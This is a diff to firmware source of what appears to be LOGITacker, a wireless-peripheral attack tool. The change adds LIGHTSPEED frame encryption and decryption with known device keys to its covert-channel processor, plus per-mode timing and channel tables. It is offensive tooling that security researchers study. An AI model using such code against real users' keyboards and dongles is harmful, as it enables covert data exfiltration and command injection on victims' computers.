@@ -12,14 +12,13 @@
 
 #define NRF_LOG_MODULE_NAME LOGITACKER_PROCESSOR_COVERT_CHANNEL
 #include "nrf_log.h"
+#include "logitacker_unifying_crypto.h"
 
 NRF_LOG_MODULE_REGISTER();
 
 
 
 
-#define COVERT_CHANNEL_TX_DELAY_MS 20
-#define COVERT_CHANNEL_PAYLOAD_MARKER 0xba
 
 //Queue for tx_data
 NRF_QUEUE_DEF(covert_channel_payload_data_t, m_covert_channel_tx_data_queue, 20, NRF_QUEUE_MODE_NO_OVERFLOW);
@@ -100,6 +99,8 @@ typedef struct {
 
     logitacker_devices_unifying_dongle_t * p_dongle;
 
+    logitacker_devices_unifying_device_t *p_device;
+
     nrf_cli_t const * p_cli;
 } logitacker_processor_covert_channel_ctx_t;
 
@@ -143,6 +144,44 @@ uint32_t logitacker_processor_covert_channel_push_tx_data(logitacker_processor_t
     return nrf_queue_push(&m_covert_channel_tx_data_queue, p_tx_data);
 }
 
+uint32_t g_series_decrypt_rx_payload(logitacker_processor_covert_channel_ctx_t *self) {
+    VERIFY_TRUE(self->p_device != NULL, NRF_ERROR_NOT_SUPPORTED);
+    VERIFY_TRUE(self->p_device->key_known, NRF_ERROR_NOT_SUPPORTED);
+    VERIFY_TRUE(self->tmp_rx_frame.length == 30, NRF_ERROR_INVALID_LENGTH);
+    VERIFY_TRUE((self->tmp_rx_frame.data[1] & 0x1f) == UNIFYING_RF_REPORT_ENCRYPTED_HIDPP_LONG, NRF_ERROR_INVALID_DATA);
+
+    uint8_t tmp_buf[22] = {0};
+
+
+    if (logitacker_unifying_crypto_decrypt_encrypted_hidpp_frame(tmp_buf, self->p_device->key, &self->tmp_rx_frame) == NRF_SUCCESS) {
+        // replace content of RX frame
+        memcpy(self->tmp_rx_frame.data, tmp_buf, 22);
+        self->tmp_rx_frame.length = 22;
+        return NRF_SUCCESS;
+    } else {
+        return NRF_ERROR_INVALID_DATA;
+    }
+}
+
+uint32_t g_series_encrypt_tx_payload(logitacker_processor_covert_channel_ctx_t *self) {
+    VERIFY_TRUE(self->p_device != NULL, NRF_ERROR_NOT_SUPPORTED);
+    VERIFY_TRUE(self->p_device->key_known, NRF_ERROR_NOT_SUPPORTED);
+    VERIFY_TRUE(self->tmp_tx_frame.length == 22, NRF_ERROR_INVALID_LENGTH);
+    VERIFY_TRUE((self->tmp_tx_frame.data[1] & 0x1f) == UNIFYING_RF_REPORT_HIDPP_LONG, NRF_ERROR_INVALID_DATA);
+
+
+    uint8_t tmp_buf[22] = {0};
+    memcpy(tmp_buf, self->tmp_tx_frame.data, 22);
+
+
+    if (logitacker_unifying_crypto_encrypt_hidpp_frame(&self->tmp_tx_frame, tmp_buf, self->p_device->key, self->p_device->last_used_aes_ctr) == NRF_SUCCESS) {
+        self->p_device->last_used_aes_ctr += 2; // advance counter by 2
+        return NRF_SUCCESS;
+    } else {
+        return NRF_ERROR_INVALID_DATA;
+    }
+}
+
 void processor_covert_channel_update_tx_frame(logitacker_processor_covert_channel_ctx_t *self) {
 /*
  * Covert channel data frame
@@ -158,8 +197,8 @@ void processor_covert_channel_update_tx_frame(logitacker_processor_covert_channe
  * 0x04         7:4     Control Type            IF CONTROL FRAME: Type of control frame, length depends on type
  * 0x04         3:2     Ack Number              Acknowledgment number (0..3)
  * 0x04         1:0     Seq Number              Sequence Number
- * 0x05..0x15   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
- * 0x16         7:0     Logitech CRC            Logitech 8 bit CRC
+ * 0x05..0x14   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
+ * 0x15         7:0     Logitech CRC            Logitech 8 bit CRC
  *
  *
  * Note:
@@ -219,8 +258,8 @@ uint32_t processor_covert_channel_process_rx_frame(logitacker_processor_covert_c
  * 0x04         7:4     Control Type            IF CONTROL FRAME: Type of control frame, length depends on type
  * 0x04         3:2     Ack Number              Acknowledgment number (0..3)
  * 0x04         1:0     Seq Number              Sequence Number
- * 0x05..0x15   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
- * 0x16         7:0     Logitech CRC            Logitech 8 bit CRC
+ * 0x05..0x14   -       Payload                 Payload (dynamic length between 0 and 15 bytes, 16 bytes for control frames)
+ * 0x15         7:0     Logitech CRC            Logitech 8 bit CRC
  *
  *
  * Note:
@@ -340,7 +379,13 @@ void processor_covert_channel_init_func(logitacker_processor_t *p_processor) {
 }
 
 void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx_t *self) {
-    self->tx_delay_ms = COVERT_CHANNEL_TX_DELAY_MS;
+    if (g_logitacker_global_config.workmode == OPTION_LOGITACKER_WORKMODE_LIGHTSPEED) {
+        self->tx_delay_ms = COVERT_CHANNEL_TX_DELAY_MS_G900;
+    } else {
+        self->tx_delay_ms = COVERT_CHANNEL_TX_DELAY_MS_UNIFYING;
+    }
+
+
 
     helper_addr_to_base_and_prefix(self->rf_base_addr, &self->rf_prefix, self->current_rf_address, LOGITACKER_DEVICE_ADDR_LEN);
 
@@ -384,7 +429,7 @@ void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx
     */
 
     // update marker
-    self->marker = COVERT_CHANNEL_PAYLOAD_MARKER & 0xfe; //assure base marker hasn't bit 0 set
+    self->marker = COVERT_CHANNEL_DATA_MARKER & 0xfe; //assure base marker hasn't bit 0 set
 
     // update TX ESB frame
     self->tmp_tx_frame.noack = false; // we want ack payloads for all our transmissions
@@ -396,12 +441,28 @@ void processor_covert_channel_init_func_(logitacker_processor_covert_channel_ctx
 
     // setup radio as PTX
     nrf_esb_set_mode(NRF_ESB_MODE_PTX);
+    switch (g_logitacker_global_config.workmode) {
+        case OPTION_LOGITACKER_WORKMODE_LIGHTSPEED:
+            nrf_esb_update_channel_frequency_table_lightspeed();
+            break;
+        case OPTION_LOGITACKER_WORKMODE_UNIFYING:
+            nrf_esb_update_channel_frequency_table_unifying();
+            break;
+        case OPTION_LOGITACKER_WORKMODE_G700:
+            nrf_esb_update_channel_frequency_table_unifying();
+            break;
+    }
+
     nrf_esb_enable_all_channel_tx_failover(true); //retransmit payloads on all channels if transmission fails
     nrf_esb_set_all_channel_tx_failover_loop_count(2); //iterate over channels two time before failing
     nrf_esb_set_retransmit_count(2);
     nrf_esb_set_retransmit_delay(250);
     nrf_esb_set_tx_power(NRF_ESB_TX_POWER_8DBM); // full power TX
 
+    // encrypt payload if LIGHTSPEED
+    if (g_logitacker_global_config.workmode == OPTION_LOGITACKER_WORKMODE_LIGHTSPEED) {
+        g_series_encrypt_tx_payload(self);
+    }
     // write payload (autostart TX is enabled for PTX mode)
     nrf_esb_write_payload(&self->tmp_tx_frame);
 }
@@ -440,6 +501,11 @@ void processor_covert_channel_timer_handler_func(logitacker_processor_t *p_proce
 }
 
 void processor_covert_channel_timer_handler_func_(logitacker_processor_covert_channel_ctx_t *self, void *p_timer_ctx) {
+    // encrypt payload if LIGHTSPEED
+    if (g_logitacker_global_config.workmode == OPTION_LOGITACKER_WORKMODE_LIGHTSPEED) {
+        g_series_encrypt_tx_payload(self);
+    }
+
     NRF_LOG_DEBUG("TX FRAME");
     NRF_LOG_HEXDUMP_DEBUG(self->tmp_tx_frame.data, self->tmp_tx_frame.length);
 
@@ -475,11 +541,18 @@ void processor_covert_channel_esb_handler_func_(logitacker_processor_covert_chan
                 NRF_LOG_DEBUG("ACK_PAY received");
 
                 while (nrf_esb_read_rx_payload(&self->tmp_rx_frame) == NRF_SUCCESS) {
+                    // decrypt payload if LIGHTSPEED
+                    if (g_logitacker_global_config.workmode == OPTION_LOGITACKER_WORKMODE_LIGHTSPEED) {
+                        g_series_decrypt_rx_payload(self);
+                    }
+
+
                     NRF_LOG_DEBUG("RX FRAME")
                     NRF_LOG_HEXDUMP_DEBUG(self->tmp_rx_frame.data, self->tmp_rx_frame.length);
                     uint32_t err = processor_covert_channel_process_rx_frame(self);
                     if (err != NRF_SUCCESS) {
-                        NRF_LOG_WARNING("Error processing inbound payload: 0x%08x", err);
+                        // this happens during normal operation (non covert channel frames), so it is logged for DEBUG only
+                        NRF_LOG_DEBUG("Error processing inbound payload: 0x%08x", err);
                     }
 
                 }
@@ -509,6 +582,9 @@ logitacker_processor_t * new_processor_covert_channel(uint8_t *rf_address, app_t
     memcpy(p_ctx->current_rf_address, rf_address, 5);
     p_ctx->timer_next_action = timer_next_action;
     p_ctx->p_cli = p_cli;
+
+    // try to retrieve device
+    logitacker_devices_get_device(&p_ctx->p_device, p_ctx->current_rf_address);
 
 
     return contruct_processor_covert_channel_instance(&m_static_covert_channel_ctx);
